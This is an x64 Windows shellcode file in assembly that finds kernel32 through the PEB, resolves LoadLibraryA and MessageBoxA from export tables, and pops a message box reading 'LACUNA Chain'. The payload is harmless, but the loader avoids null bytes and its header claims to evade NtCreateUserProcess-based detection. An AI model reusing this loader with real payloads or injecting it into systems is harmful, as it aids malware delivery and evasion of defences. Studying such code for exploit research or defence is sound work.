; msgbox.asm — x64 Windows shellcode
; PEB walk → kernel32 → LoadLibraryA("user32.dll") → MessageBoxA
; No child process spawned — does not trigger NtCreateUserProcess detection
;
; Mohamed Alzhrani (0xmaz)
;
; build: nasm -f bin -o msgbox.bin msgbox.asm

BITS 64
default rel

_start:
    push rbp
    mov  rbp, rsp
    and  rsp, 0xFFFFFFFFFFFFFFF0
    sub  rsp, 0x80

    ; ── kernel32 base via PEB ──
    ; [gs:rcx+0x60] with rcx=0 avoids the null bytes in [gs:0x60] encoding
    xor  rcx, rcx
    mov  rax, [gs:rcx + 0x60]      ; PEB
    mov  rax, [rax + 0x18]         ; Ldr
    mov  rax, [rax + 0x20]         ; InMemoryOrderModuleList → exe
    mov  rax, [rax]                 ; → ntdll
    mov  rax, [rax]                 ; → kernel32
    mov  rbx, [rax + 0x20]         ; DllBase  (InMemoryOrderLinks+0x20 = entry+0x30)

    ; ── parse kernel32 export directory ──
    mov  eax, [rbx + 0x3c]         ; e_lfanew
    add  rax, rbx
    mov  eax, [rax + 0x88]         ; DataDirectory[EXPORT].VirtualAddress
    add  rax, rbx
    mov  rdx, rax

    mov  ecx,  [rdx + 0x18]        ; NumberOfNames
    mov  r8d,  [rdx + 0x20]        ; AddressOfNames RVA
    add  r8,   rbx
    mov  r9d,  [rdx + 0x24]        ; AddressOfNameOrdinals RVA
    add  r9,   rbx
    mov  r10d, [rdx + 0x1c]        ; AddressOfFunctions RVA
    add  r10,  rbx

    ; ── find LoadLibraryA ──
    ; "Load" → 0x64616F4C
    ; "Libr" → 0x7262694C
    ; "aryA" → 0x41797261
find_lla:
    dec  ecx
    js   done
    mov  esi, [r8 + rcx*4]
    add  rsi, rbx
    cmp  dword [rsi],   0x64616F4C
    jnz  find_lla
    cmp  dword [rsi+4], 0x7262694C
    jnz  find_lla
    cmp  dword [rsi+8], 0x41797261
    jnz  find_lla

    movzx ecx, word [r9 + rcx*2]
    mov   eax, [r10 + rcx*4]
    add   rax, rbx                  ; rax = LoadLibraryA

    ; ── LoadLibraryA("user32.dll") ──
    sub  rsp, 0x20
    lea  rcx, [rel str_user32]
    call rax
    add  rsp, 0x20
    test rax, rax
    jz   done
    mov  rbx, rax                   ; rbx = user32.dll base

    ; ── parse user32 export directory ──
    mov  eax, [rbx + 0x3c]
    add  rax, rbx
    mov  eax, [rax + 0x88]
    add  rax, rbx
    mov  rdx, rax

    mov  ecx,  [rdx + 0x18]
    mov  r8d,  [rdx + 0x20]
    add  r8,   rbx
    mov  r9d,  [rdx + 0x24]
    add  r9,   rbx
    mov  r10d, [rdx + 0x1c]
    add  r10,  rbx

    ; ── find MessageBoxA ──
    ; "Mess" → 0x7373654D
    ; "ageB" → 0x42656761
    ; "ox"   → 0x786F  (word, avoids null from "oxA\0" dword)
    ; 'A'    → 0x41
find_mba:
    dec  ecx
    js   done
    mov  esi, [r8 + rcx*4]
    add  rsi, rbx
    cmp  dword [rsi],    0x7373654D
    jnz  find_mba
    cmp  dword [rsi+4],  0x42656761
    jnz  find_mba
    cmp  word  [rsi+8],  0x786F
    jnz  find_mba
    cmp  byte  [rsi+10], 0x41
    jnz  find_mba

    movzx ecx, word [r9 + rcx*2]
    mov   eax, [r10 + rcx*4]
    add   rax, rbx                  ; rax = MessageBoxA

    ; ── MessageBoxA(NULL, text, caption, MB_OK) ──
    sub  rsp, 0x20
    xor  ecx, ecx                   ; hWnd = NULL
    lea  rdx, [rel str_text]        ; lpText
    lea  r8,  [rel str_caption]     ; lpCaption
    xor  r9d, r9d                   ; uType = MB_OK
    call rax
    add  rsp, 0x20

done:
    xor  eax, eax
    leave
    ret

str_user32:  db "user32.dll", 0
str_text:    db "LACUNA Chain", 0
str_caption: db "0xmaz", 0
